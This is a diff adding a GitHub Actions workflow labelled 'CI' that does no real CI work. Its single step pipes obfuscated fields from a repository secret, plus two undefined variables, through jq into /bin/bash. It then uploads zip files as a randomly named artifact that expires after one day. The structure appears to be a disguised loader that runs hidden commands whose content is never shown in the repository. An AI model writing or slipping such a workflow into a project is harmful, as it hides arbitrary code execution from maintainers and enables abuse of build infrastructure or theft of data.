@@ -1,0 +1,26 @@
+name: CI
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          v20390: ${{ secrets.v20390 }}
+        run: |
+          printf '%s' "$v20390" | jq -r .ud01 | /bin/bash
+          printf '%s' "$rvnb901" | jq -r .x3110 | /bin/bash
+          printf '%s' "$gykbi60996" | jq -r .ditpl56706 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: xcvTR61T
+          path: "*.zip"
+          retention-days: 1
